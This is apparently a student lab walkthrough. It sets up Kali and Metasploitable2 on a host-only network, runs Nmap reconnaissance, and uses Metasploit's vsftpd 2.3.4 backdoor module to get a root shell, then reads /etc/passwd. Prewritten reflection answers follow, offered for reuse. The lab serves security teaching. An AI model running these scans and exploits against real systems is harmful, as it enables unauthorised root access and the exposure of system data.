Do this for both Kali and Metasploitable2:

  • Change "Attached to" → Host-Only Adapter
  • Click OK

Start both VMs, then log in with these credentials:

kali / kali

On Metasploitable2 terminal, run:

ifconfig # Look for inet addr — note the IP (e.g. 192.168.56.101)

On Kali terminal, run:

Then test the connection from Kali:

ping -c 4 192.168.56.101
✓

You should see 4 packets transmitted, 4 received, 0% packet loss. If so, you're ready to proceed!

Part A

Nmap Reconnaissance

✦

Run all four scans from your Kali terminal. Replace 192.168.56.101 with your actual Metasploitable IP if different.

Scan 1 — Basic Port Scan
nmap 192.168.56.101

Shows all open ports and services. No version info yet.

Scan 2 — Version Detection
nmap -sV 192.168.56.101

Reveals exact service versions — critical for finding CVEs.

Scan 3 — OS Detection
sudo nmap -O 192.168.56.101

Fingerprints the target OS. Note: capital O, not zero!

Scan 4 — Combined Scan + Save to File
sudo nmap -sV -O -oN nmap_scan_results.txt 192.168.56.101

Saves everything to a file. View it with:

cat nmap_scan_results.txt
✦

Use your Scan 2 and 4 results to fill in the Observation Table. For the CVE column, Google each service version (e.g. "vsftpd 2.3.4 CVE") on nvd.nist.gov.

Part B

Metasploit Exploitation

✦

You'll be exploiting CVE-2011-2523 — a backdoor in vsftpd 2.3.4 that grants root access when triggered.

Step 1 — Launch Metasploit
msfconsole

Wait ~30 seconds for it to load. You'll see the msf6 > prompt.

Steps 2–5 — Search, Load, Configure, Run
# Search for the exploit search vsftpd # Load it use exploit/unix/ftp/vsftpd_234_backdoor # Set the target IP set RHOSTS 192.168.56.101 # Run it! run
✓

Success looks like: "Command shell session 1 opened" followed by a blank line. That blank line IS your shell — you're now inside Metasploitable as root!

Step 6 — Collect Evidence (run these in the shell)
id whoami hostname uname -a cat /etc/passwd | head -5

Screenshot or copy all outputs — you'll need them for the observation table.

Step 7 — Exit Cleanly
exit # exits the target shell exit # exits msfconsole
⚠

If the exploit fails with "no session created", wait 30 seconds and type run again. The backdoor port occasionally needs a moment to reset.

Part D

Reflection Questions

✦
FEEL FREE TO MODIFY ALL OF EM
Q1 — Vulnerability vs Threat

"A vulnerability is a weakness in a system that can be exploited, while a threat is the potential actor or action that takes advantage of that weakness. In our lab, the vulnerability was the backdoor in vsftpd 2.3.4 (CVE-2011-2523) since it was a flaw in the software itself. The threat was an attacker using Metasploit to exploit that backdoor and gain unauthorized root access."

Q2 — Why -sV is Critical

"Service version detection is critical because just knowing a port is open isn't enough — you need to know exactly what software and version is running to identify if it has known vulnerabilities. For example, without -sV we only saw that port 21 was running FTP, but with -sV we found out it was specifically vsftpd 2.3.4 which has a critical backdoor. Running outdated unpatched software means attackers can look up the exact CVE and exploit it easily, putting the whole organization at risk."

Q3 — "Excellent" Reliability Rating

"The 'excellent' reliability rating in Metasploit means the exploit works consistently without crashing or destabilizing the target service, making it very easy for even a beginner attacker to use successfully. From a risk perspective this is very serious because it means the vulnerability is not only real but also highly repeatable and reliable, so any attacker who finds vsftpd 2.3.4 running on a server can exploit it with almost guaranteed success."

Q4 — Telnet vs SSH

"Telnet is considered a security risk because it sends all data including usernames and passwords in plaintext over the network, meaning anyone who can intercept the traffic can read the credentials directly. SSH on the other hand encrypts all communication so even if someone intercepts the traffic they cannot read it. So even without a specific exploit, Telnet is dangerous simply because of how it was designed — it was never built with security in mind."

Q5 — Top 3 Priorities

"The three vulnerabilities I would prioritize first are vsftpd 2.3.4, Telnet, and Samba, since all three scored 9 (CRITICAL) on the risk matrix with both likelihood and impact rated at 3. The vsftpd backdoor is the most urgent since we already proved it gives full root access with no credentials needed. Telnet should be disabled immediately since it exposes credentials to anyone on the network. Samba's CVE-2007-2447 also allows remote code execution which means an attacker can take over the machine without even needing FTP access."

Q6 — CIA Triad

"All three components of the CIA Triad are threatened by our findings. Confidentiality is violated because root access allows an attacker to read any file on the system including sensitive data and password hashes. Integrity is threatened because with root access an attacker can modify, delete, or plant files without any restriction. Availability is also at risk since the attacker could shut down services or the entire machine. The vsftpd backdoor alone is enough to compromise all three, making it the most critical finding of the assessment."
